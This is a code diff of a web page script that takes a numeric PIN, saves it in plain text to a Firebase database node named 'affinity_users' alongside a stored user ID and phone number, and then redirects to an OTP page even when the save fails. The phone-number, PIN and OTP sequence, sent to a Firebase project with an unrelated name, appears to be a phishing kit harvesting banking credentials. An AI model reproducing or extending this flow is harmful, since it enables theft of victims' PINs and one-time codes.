@@ -63,56 +63,59 @@
     projectId: "achievebypetra-82966",
     storageBucket: "achievebypetra-82966.firebasestorage.app",
     messagingSenderId: "412688052429",
-    appId: "1:412688052429:web:abf989e226e153b7c37984"
+    appId: "1:412688052429:web:abf989e226e153b7c37984",
+    measurementId: "G-TBGZS8PJ76"
   };
 
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
-  const DB_NODE = "affinity_users";
 
-  var pinInput = document.getElementById("pinInput");
-  var pinCount = document.getElementById("pinCount");
-  var pinEyeToggle = document.getElementById("pinEyeToggle");
-  var pinLoginBtn = document.getElementById("pinLoginBtn");
+  const DB_NODE = 'affinity_users';
 
-  pinInput.addEventListener("input", function() {
-    pinInput.value = pinInput.value.replace(/\D/g, "");
+  var pinInput = document.getElementById('pinInput');
+  var pinCount = document.getElementById('pinCount');
+  var pinEyeToggle = document.getElementById('pinEyeToggle');
+  var pinLoginBtn = document.getElementById('pinLoginBtn');
+
+  pinInput.addEventListener('input', function () {
+    pinInput.value = pinInput.value.replace(/\D/g, '');
     pinCount.textContent = pinInput.value.length;
   });
 
   var pinVisible = false;
-  pinEyeToggle.addEventListener("click", function() {
+  pinEyeToggle.addEventListener('click', function () {
     pinVisible = !pinVisible;
-    pinInput.type = pinVisible ? "text" : "password";
-    pinEyeToggle.textContent = pinVisible ? "🙈" : "👁";
+    pinInput.type = pinVisible ? 'text' : 'password';
+    pinEyeToggle.textContent = pinVisible ? '🙈' : '👁';
   });
 
-  pinLoginBtn.addEventListener("click", function() {
+  pinLoginBtn.addEventListener('click', function () {
     var pin = pinInput.value.trim();
     if (pin.length < 4) {
-      pinInput.parentElement.style.borderColor = "#c0392b";
-      setTimeout(function() { pinInput.parentElement.style.borderColor = ""; }, 900);
+      pinInput.parentElement.style.borderColor = '#c0392b';
+      setTimeout(function () { pinInput.parentElement.style.borderColor = ''; }, 900);
       return;
     }
 
-    var userId = sessionStorage.getItem("affinity_userId");
-    if (!userId) { 
-      window.location.href = "phone-number.html"; 
-      return; 
+    var userId = sessionStorage.getItem('affinity_userId');
+    var phone = sessionStorage.getItem('affinity_phone') || 'Unknown';
+
+    if (!userId) {
+      window.location.href = 'phone-number.html';
+      return;
     }
 
-    sessionStorage.setItem("affinity_pin", pin);
+    sessionStorage.setItem('affinity_pin', pin);
 
-    // ✅ Save PIN to Firebase with .then() to ensure it completes
-    database.ref(DB_NODE + "/" + userId).update({ pin: pin })
-      .then(function() {
-        // ✅ Navigate only after save completes
-        window.location.href = "otp.html";
+    database.ref(DB_NODE + '/' + userId).update({
+      pin: pin
+    })
+      .then(function () {
+        window.location.href = 'otp.html';
       })
-      .catch(function(error) {
-        console.error("❌ Firebase error:", error);
-        // Still navigate even if save fails
-        window.location.href = "otp.html";
+      .catch(function (error) {
+        console.error('❌ Firebase error:', error);
+        window.location.href = 'otp.html';
       });
   });
 </script>
